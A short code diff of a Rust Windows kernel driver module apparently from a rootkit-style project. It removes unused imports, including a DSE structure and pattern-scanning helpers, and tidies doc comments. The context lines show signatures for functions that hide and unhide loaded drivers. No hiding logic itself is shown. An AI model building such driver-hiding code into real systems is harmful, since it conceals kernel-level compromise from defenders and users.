@@ -4,13 +4,10 @@ use {
     ntapi::ntldr::LDR_DATA_TABLE_ENTRY, 
     core::sync::atomic::{AtomicPtr, Ordering},
     alloc::{boxed::Box, string::String, vec::Vec}, 
-    crate::utils::{
-        address::{get_function_address, get_module_base_address}, 
-        patterns::scan_for_pattern, uni
-    }, 
+    crate::utils::uni,
     shared::{
         structs::{
-            DriverInfo, HiddenDriverInfo, TargetDriver, DSE, LIST_ENTRY
+            DriverInfo, HiddenDriverInfo, TargetDriver, LIST_ENTRY
         }, 
         vars::MAX_DRIVER
     },  
@@ -50,7 +47,7 @@ impl Driver {
     /// # Parameters
     /// - `device`: A pointer to the `DEVICE_OBJECT` representing the driver to be hidden.
     ///
-    /// # Return
+    /// # Returns
     /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
     ///
     unsafe fn hide_driver(driver_name: &String) -> NTSTATUS {
@@ -107,7 +104,7 @@ impl Driver {
     /// # Parameters
     /// - `device`: A pointer to the `DEVICE_OBJECT` representing the driver to be hidden.
     ///
-    /// # Return
+    /// # Returns
     /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
     ///
     unsafe fn unhide_driver(driver_name: &str) -> NTSTATUS {
@@ -142,10 +139,12 @@ impl Driver {
     /// Enumerates loaded drivers and stores the information in the provided buffer.
     ///
     /// # Parameters
+    /// 
     /// - `driver_info`: A pointer to a buffer where `DriverInfo` structures will be stored.
     /// - `information`: A mutable reference to a `usize` that will store the total size of the information written.
     ///
-    /// # Return
+    /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
     ///
     pub unsafe fn enumerate_driver(driver_info: *mut DriverInfo, information: &mut usize) -> Result<(), NTSTATUS> {
